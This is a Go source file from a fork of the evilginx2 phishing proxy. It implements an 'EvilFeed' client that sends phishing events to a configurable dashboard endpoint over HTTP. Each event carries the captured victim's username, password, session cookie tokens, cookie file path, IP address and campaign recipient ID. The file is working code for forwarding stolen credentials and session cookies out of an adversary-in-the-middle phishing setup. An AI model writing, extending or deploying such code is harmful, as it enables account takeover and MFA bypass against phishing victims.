package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// EvilFeedClient handles communication with the EvilFeed dashboard
type EvilFeedClient struct {
	endpoint string
	enabled  bool
	client   *http.Client
}

// EvilFeedEvent represents an event to send to EvilFeed
type EvilFeedEvent struct {
	Timestamp  int64  `json:"timestamp"`
	Type       string `json:"type"`
	Phishlet   string `json:"phishlet"`
	IP         string `json:"ip"`
	Username   string `json:"username,omitempty"`
	Password   string `json:"password,omitempty"`
	SessionID  string `json:"session_id,omitempty"`
	Tokens     string `json:"tokens,omitempty"`
	CookieFile string `json:"cookie_file,omitempty"` // Path to exported cookie file
	Message    string `json:"message,omitempty"`
	RID        string `json:"rid,omitempty"` // GoPhish Recipient ID for campaign tracking
}

// NewEvilFeedClient creates a new EvilFeed client
func NewEvilFeedClient() *EvilFeedClient {
	return &EvilFeedClient{
		endpoint: "http://127.0.0.1:1337/api/internal/ingest",
		enabled:  false,
		client: &http.Client{
			Timeout: 5 * time.Second,
		},
	}
}

// Enable enables the EvilFeed client with optional custom endpoint
func (e *EvilFeedClient) Enable(endpoint string) {
	if endpoint != "" {
		e.endpoint = endpoint
	}
	e.enabled = true
	log.Success("EvilFeed enabled: %s", e.endpoint)
}

// Disable disables the EvilFeed client
func (e *EvilFeedClient) Disable() {
	e.enabled = false
	log.Info("EvilFeed disabled")
}

// IsEnabled returns whether EvilFeed is enabled
func (e *EvilFeedClient) IsEnabled() bool {
	return e.enabled
}

// GetEndpoint returns the current endpoint
func (e *EvilFeedClient) GetEndpoint() string {
	return e.endpoint
}

// SetEndpoint sets the endpoint URL
func (e *EvilFeedClient) SetEndpoint(endpoint string) {
	e.endpoint = endpoint
}

// SendEvent sends an event to EvilFeed
func (e *EvilFeedClient) SendEvent(event *EvilFeedEvent) error {
	if !e.enabled {
		return nil
	}

	if event.Timestamp == 0 {
		event.Timestamp = time.Now().UnixMilli()
	}

	data, err := json.Marshal(event)
	if err != nil {
		return fmt.Errorf("failed to marshal event: %v", err)
	}

	resp, err := e.client.Post(e.endpoint, "application/json", bytes.NewBuffer(data))
	if err != nil {
		log.Warning("EvilFeed send failed: %v", err)
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Warning("EvilFeed returned status %d", resp.StatusCode)
		return fmt.Errorf("evilfeed returned status %d", resp.StatusCode)
	}

	return nil
}

// NotifyNewSession sends a new session event to EvilFeed
func (e *EvilFeedClient) NotifyNewSession(session *database.Session, rid ...string) {
	if !e.enabled || session == nil {
		return
	}

	event := &EvilFeedEvent{
		Type:      "open",
		Phishlet:  session.Phishlet,
		IP:        session.RemoteAddr,
		SessionID: session.SessionId,
		Message:   fmt.Sprintf("New visitor from %s", session.RemoteAddr),
	}
	// Set RID if provided (for GoPhish campaign tracking)
	if len(rid) > 0 && rid[0] != "" {
		event.RID = rid[0]
	}

	go func() {
		if err := e.SendEvent(event); err != nil {
			log.Debug("EvilFeed notify new session failed: %v", err)
		}
	}()
}

// NotifyCredentialsCaptured sends a credentials captured event to EvilFeed
func (e *EvilFeedClient) NotifyCredentialsCaptured(session *database.Session, rid ...string) {
	if !e.enabled || session == nil {
		return
	}

	event := &EvilFeedEvent{
		Type:      "credentials",
		Phishlet:  session.Phishlet,
		IP:        session.RemoteAddr,
		Username:  session.Username,
		Password:  session.Password,
		SessionID: session.SessionId,
		Message:   fmt.Sprintf("Credentials captured: %s", session.Username),
	}
	// Set RID if provided (for GoPhish campaign tracking)
	if len(rid) > 0 && rid[0] != "" {
		event.RID = rid[0]
	}

	go func() {
		if err := e.SendEvent(event); err != nil {
			log.Debug("EvilFeed notify credentials failed: %v", err)
		}
	}()
}

// NotifySessionCaptured sends a session (cookies) captured event to EvilFeed
func (e *EvilFeedClient) NotifySessionCaptured(session *database.Session, rid ...string) {
	e.NotifySessionCapturedWithFile(session, "", rid...)
}

// NotifySessionCapturedWithFile sends a session (cookies) captured event to EvilFeed with cookie file path
func (e *EvilFeedClient) NotifySessionCapturedWithFile(session *database.Session, cookieFilePath string, rid ...string) {
	if !e.enabled || session == nil {
		return
	}

	// Convert cookie tokens to JSON string
	tokensJSON := ""
	if len(session.CookieTokens) > 0 {
		if data, err := json.Marshal(session.CookieTokens); err == nil {
			tokensJSON = string(data)
		}
	}

	event := &EvilFeedEvent{
		Type:       "session",
		Phishlet:   session.Phishlet,
		IP:         session.RemoteAddr,
		Username:   session.Username,
		Password:   session.Password,
		SessionID:  session.SessionId,
		Tokens:     tokensJSON,
		CookieFile: cookieFilePath,
		Message:    fmt.Sprintf("Session captured for %s", session.Username),
	}
	// Set RID if provided (for GoPhish campaign tracking)
	if len(rid) > 0 && rid[0] != "" {
		event.RID = rid[0]
	}

	go func() {
		if err := e.SendEvent(event); err != nil {
			log.Debug("EvilFeed notify session captured failed: %v", err)
		}
	}()
}

// NotifyClick sends a click event to EvilFeed
func (e *EvilFeedClient) NotifyClick(phishlet string, ip string, sessionID string, rid ...string) {
	if !e.enabled {
		return
	}

	event := &EvilFeedEvent{
		Type:      "click",
		Phishlet:  phishlet,
		IP:        ip,
		SessionID: sessionID,
		Message:   fmt.Sprintf("Link clicked from %s", ip),
	}
	// Set RID if provided (for GoPhish campaign tracking)
	if len(rid) > 0 && rid[0] != "" {
		event.RID = rid[0]
	}

	go func() {
		if err := e.SendEvent(event); err != nil {
			log.Debug("EvilFeed notify click failed: %v", err)
		}
	}()
}

// NotifyBot sends a bot detection event to EvilFeed
func (e *EvilFeedClient) NotifyBot(ip string, reason string, rid ...string) {
	if !e.enabled {
		return
	}

	event := &EvilFeedEvent{
		Type:    "bot",
		IP:      ip,
		Message: reason,
	}
	// Set RID if provided (for GoPhish campaign tracking)
	if len(rid) > 0 && rid[0] != "" {
		event.RID = rid[0]
	}

	go func() {
		if err := e.SendEvent(event); err != nil {
			log.Debug("EvilFeed notify bot failed: %v", err)
		}
	}()
}

// SetLureUrl sends the active lure URL to EvilFeed's settings
func (e *EvilFeedClient) SetLureUrl(lureUrl string) error {
	if !e.enabled {
		return fmt.Errorf("EvilFeed is not enabled")
	}

	// Build the settings endpoint URL from the ingest endpoint
	// e.endpoint is like "http://127.0.0.1:1337/api/internal/ingest"
	// We need "http://127.0.0.1:1337/api/internal/settings"
	settingsEndpoint := e.endpoint[:len(e.endpoint)-len("ingest")] + "settings"

	payload := map[string]string{
		"lure_url": lureUrl,
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal lure URL: %v", err)
	}

	resp, err := e.client.Post(settingsEndpoint, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return fmt.Errorf("failed to send lure URL to EvilFeed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("EvilFeed returned status %d", resp.StatusCode)
	}

	return nil
}
